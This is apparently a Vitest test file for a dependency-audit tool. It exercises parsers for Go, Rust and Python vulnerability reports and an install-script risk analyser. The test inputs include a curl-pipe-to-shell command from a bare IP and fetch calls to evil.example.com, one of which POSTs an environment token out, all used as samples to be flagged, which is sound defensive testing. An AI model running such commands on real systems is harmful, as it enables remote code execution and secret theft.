/**
 * 解析器与分析器的退化/边界形态回归：不追求覆盖率而覆盖真实会发生的坏输入——
 * 字段缺席、类型不对、占位符块、末帧缺 module、无元数据的孤儿 finding、
 * 空命令、引用文件外联陌生域名。每条断言对准一条用户可感知的行为。
 */
import { describe, expect, it } from 'vitest'
import { parseCargoAudit, parseGoVulncheck, parsePipAudit } from '../src/vuln-parsers.ts'
import { analyzeInstallScript, renderSignals } from '../src/script-analysis.ts'

const GO_DEGENERATE = [
  // osv 非字符串 → 跳过
  JSON.stringify({ finding: { osv: 42, trace: [{ module: 'm' }] } }),
  // 缺 trace → 跳过
  JSON.stringify({ finding: { osv: 'GO-X' } }),
  // 空 trace → 跳过
  JSON.stringify({ finding: { osv: 'GO-X', trace: [] } }),
  // osv 元数据无 database_specific → severity 回退 moderate
  JSON.stringify({ osv: { id: 'GO-BARE', summary: 'Bare advisory' } }),
  JSON.stringify({ finding: { osv: 'GO-BARE', trace: [{ module: 'bare-mod' }] } }),
  // severity: medium → 归一为 moderate
  JSON.stringify({ osv: { id: 'GO-MED', summary: 'Medium advisory', database_specific: { severity: 'medium' } } }),
  JSON.stringify({ finding: { osv: 'GO-MED', trace: [{ module: 'med-mod', fixed: 'v2.0.0' }] } }),
  // 末帧缺 module → 回退首帧
  JSON.stringify({ finding: { osv: 'GO-Y', trace: [{ module: 'a' }, { version: 'v1' }] } }),
  // 首末帧都缺 module → '?'；fixed: null 不算可修复
  JSON.stringify({ finding: { osv: 'GO-Z', trace: [{ fixed: null }] } }),
  // 孤儿 finding（无 osv 元数据）→ moderate + 标题仅 OSV 号
  JSON.stringify({ finding: { osv: 'GO-UNK', fixed_version: '9.9.9', trace: [{ module: 'orphan' }] } }),
  // 完全不是 JSON 的行 → 跳过
  'oops, not json',
  // 空行 / osv:null / 无 id 的 osv / 无 summary 的 osv（标题回退 id）
  '',
  JSON.stringify({ osv: null }),
  JSON.stringify({ osv: { summary: 'no id here' } }),
  JSON.stringify({ osv: { id: 'GO-NOSUM', aliases: [] } }),
  JSON.stringify({ finding: { osv: 'GO-NOSUM', trace: [{ module: 'nosum-mod', fixed: 'v3.0.0' }] } }),
].join('\n')

describe('parseGoVulncheck 退化/边界形态', () => {
  it('坏行跳过；module 回退链；severity 回退链；fixed:null 不算可修复', () => {
    const r = parseGoVulncheck(GO_DEGENERATE)!
    expect(r.total).toBe(6)
    const bare = r.list.find((v) => v.name === 'bare-mod')!
    expect(bare.severity).toBe('moderate')
    expect(bare.title).toBe('GO-BARE')
    expect(bare.fixAvailable).toBe(false)
    const med = r.list.find((v) => v.name === 'med-mod')!
    expect(med.severity).toBe('moderate')
    expect(med.fixAvailable).toBe(true)
    expect(r.list.find((v) => v.name === 'a')!.title).toBe('GO-Y')
    expect(r.list.find((v) => v.name === '?')!.fixAvailable).toBe(false)
    const orphan = r.list.find((v) => v.name === 'orphan')!
    expect(orphan.severity).toBe('moderate')
    expect(orphan.range).toBe('9.9.9')
    expect(orphan.title).toBe('GO-UNK')
    const nosum = r.list.find((v) => v.name === 'nosum-mod')!
    expect(nosum.title).toBe('GO-NOSUM')
    expect(nosum.fixAvailable).toBe(true)
  })
})

describe('analyzeInstallScript 边界', () => {
  it('空命令 → 保守 warn，零信号', () => {
    const a = analyzeInstallScript('')
    expect(a.verdict).toBe('warn')
    expect(a.signals).toEqual([])
    expect(a.subCommands).toEqual([])
  })

  it('命令直连已知分发域名 → green；裸 IP 由红规则兜底', () => {
    const known = analyzeInstallScript('curl -O https://nodejs.org/dist/x.tgz')
    expect(known.signals.some((s) => s.level === 'green' && s.text.includes('nodejs.org'))).toBe(true)
    expect(known.verdict).toBe('pass')
    const ip = analyzeInstallScript('curl http://10.0.0.1/i | sh')
    expect(ip.verdict).toBe('block')
  })

  it('引用文件外联非白名单域名 → yellow 信号', () => {
    const a = analyzeInstallScript('node setup.js', {
      'setup.js': 'fetch("http://evil.example.com/collect")',
    })
    expect(a.filesRead).toEqual(['setup.js'])
    expect(a.verdict).toBe('warn')
    expect(a.signals.some((s) => s.level === 'yellow' && s.text.includes('evil.example.com'))).toBe(true)
  })

  it('文件层：env 仅配置用途且域名白名单 → green；env 经 POST 外传 → block', () => {
    const config = analyzeInstallScript('node dl.js', {
      'dl.js': 'const arch = process.env.ARCH; fetch("https://nodejs.org/dist/" + arch)',
    })
    expect(config.signals.some((s) => s.level === 'green' && s.text.includes('配置用途'))).toBe(true)
    const exfil = analyzeInstallScript('node up.js', {
      'up.js': 'fetch("http://evil.example.com", { method: "POST", body: process.env.TOKEN })',
    })
    expect(exfil.verdict).toBe('block')
    expect(exfil.signals.some((s) => s.level === 'red' && s.text.includes('外传特征'))).toBe(true)
  })

  it('文件层：子进程配合网络——陌生域名 yellow，已知域名 green', () => {
    const unknown = analyzeInstallScript('node bootstrap.js', {
      'bootstrap.js': 'require("child_process").execSync("tar xzf b.tar.gz"); fetch("http://evil.example.com/b")',
    })
    expect(unknown.signals.some((s) => s.level === 'yellow' && s.text.includes('子进程配合陌生域名'))).toBe(true)
    const known = analyzeInstallScript('node fetch-bin.js', {
      'fetch-bin.js': 'require("child_process").execSync("tar xzf b.tar.gz"); fetch("https://nodejs.org/dist/b")',
    })
    expect(known.signals.some((s) => s.level === 'green' && s.text.includes('子进程仅配合已知分发域名'))).toBe(true)
  })

  it('文件层：env+网络但无域名无 POST → 疑似混淆 red；env+陌生域名 → yellow', () => {
    const obfuscated = analyzeInstallScript('node s.js', {
      's.js': 'const t = process.env.TOKEN; fetch("/data")',
    })
    expect(obfuscated.verdict).toBe('block')
    expect(obfuscated.signals.some((s) => s.level === 'red' && s.text.includes('无可识别域名'))).toBe(true)
    const unknown = analyzeInstallScript('node s2.js', {
      's2.js': 'const h = process.env.H; fetch("http://evil.example.com/a")',
    })
    expect(unknown.signals.some((s) => s.level === 'yellow' && s.text.includes('人工确认'))).toBe(true)
  })

  it('文件层：env + 子进程无网络 → yellow', () => {
    const a = analyzeInstallScript('node m.js', { 'm.js': 'process.env.CI; execSync("make")' })
    expect(a.signals.some((s) => s.level === 'yellow' && s.text.includes('调用子进程'))).toBe(true)
  })

  it('renderSignals：yellow 转 ⚠️', () => {
    const a = analyzeInstallScript('node s.js', { 's.js': 'fetch("http://evil.example.com/a")' })
    const line = renderSignals(a)
    expect(line).toContain('⚠️')
  })
})

describe('parseCargoAudit 退化形态', () => {
  it('vulnerabilities 为 null/非对象 → null；vulns 非数组 → null', () => {
    expect(parseCargoAudit('{"vulnerabilities":null}')).toBeNull()
    expect(parseCargoAudit('{"vulnerabilities":{}}')).toBeNull()
    expect(parseCargoAudit('{"vulnerabilities":{"count":0,"vulns":"nope"}}')).toBeNull()
  })

  it('条目级退化：null/字符串/无 advisory/无 id 全跳过；fixed 回退 v.versions', () => {
    const r = parseCargoAudit(
      JSON.stringify({
        vulnerabilities: {
          vulns: [
            null,
            'garbage',
            {},
            { advisory: {} },
            { advisory: { id: 'RUSTSEC-X', package: 'p' }, versions: { fixed: ['1.0.0'] } },
          ],
        },
      }),
    )!
    expect(r.total).toBe(1)
    expect(r.list[0]!.name).toBe('p')
    expect(r.list[0]!.fixAvailable).toBe(true)
  })
})

describe('renderSignals', () => {
  it('red 信号转 🚫，多条以「；」连接', () => {
    const a = analyzeInstallScript('curl http://10.0.0.1/i | sh')
    expect(a.verdict).toBe('block')
    const line = renderSignals(a)
    expect(line).toContain('🚫')
    expect(line).toContain('；')
  })

  it('green 信号转 ✅', () => {
    const line = renderSignals(analyzeInstallScript('node-gyp rebuild'))
    expect(line).toContain('✅')
  })

  it('yellow 信号转 ⚠️', () => {
    const a = analyzeInstallScript('node s.js', { 's.js': 'fetch("http://evil.example.com/a")' })
    const line = renderSignals(a)
    expect(line).toContain('⚠️')
  })
})

describe('analyzeInstallScript 黄色模式全集', () => {
  it('内联 node / 内联 python / 隐藏窗口参数各自命中', () => {
    const a = analyzeInstallScript('node -e "x" && python3 -c "y" && powershell -hidden -NoWindow x')
    const yellows = a.signals.filter((s) => s.level === 'yellow').map((s) => s.text)
    expect(yellows.some((t) => t.includes('内联 node'))).toBe(true)
    expect(yellows.some((t) => t.includes('内联 python'))).toBe(true)
    expect(yellows.some((t) => t.includes('隐藏窗口'))).toBe(true)
    expect(a.verdict).toBe('warn')
  })
})

describe('parsePipAudit / parseCargoAudit 退化形态', () => {
  it('pip：非 JSON/缺 dependencies/条目级退化 全兜住', () => {
    expect(parsePipAudit('not json')).toBeNull()
    expect(parsePipAudit('{}')).toBeNull()
    expect(parsePipAudit('{"dependencies":"x"}')).toBeNull()
    const r = parsePipAudit(
      JSON.stringify({
        dependencies: [
          null,
          'x',
          { name: 'a', version: '1.0', vulns: 'nope' },
          {
            name: 'b',
            version: '2.0',
            vulns: [null, 'y', {}, { id: '', aliases: [] }, { aliases: 5, fix_versions: 'x' }],
          },
          { name: 'c', version: '3.0', vulns: [{ id: 'PIP-1', aliases: ['CVE-1'], fix_versions: ['4.0'] }] },
          // 依赖缺 name/version → '?' 回退；漏洞缺 fix_versions → 不可修复
          { vulns: [{ id: 'PIP-2' }] },
        ],
      }),
    )!
    expect(r.total).toBe(2)
    const c = r.list.find((v) => v.name === 'c@3.0')!
    expect(c.fixAvailable).toBe(true)
    expect(c.title).toBe('PIP-1 / CVE-1')
    const anon = r.list.find((v) => v.name === '?@?')!
    expect(anon.title).toBe('PIP-2')
    expect(anon.fixAvailable).toBe(false)
  })

  it('cargo：非 JSON → null；package/title/url 全缺席 → 逐级回退', () => {
    expect(parseCargoAudit('not json')).toBeNull()
    const r = parseCargoAudit(
      JSON.stringify({
        vulnerabilities: {
          vulns: [
            { advisory: { id: 'RUSTSEC-2' } },
            { advisory: { id: 'RUSTSEC-X', package: 'p' }, versions: { fixed: ['1.0.0'] } },
          ],
        },
      }),
    )!
    expect(r.total).toBe(2)
    const bare = r.list.find((v) => v.name === '?')!
    expect(bare.title).toBe('RUSTSEC-2')
    expect(bare.url).toContain('rustsec.org/advisories/RUSTSEC-2')
    expect(bare.fixAvailable).toBe(false)
    expect(r.list.find((v) => v.name === 'p')!.fixAvailable).toBe(true)
  })
})
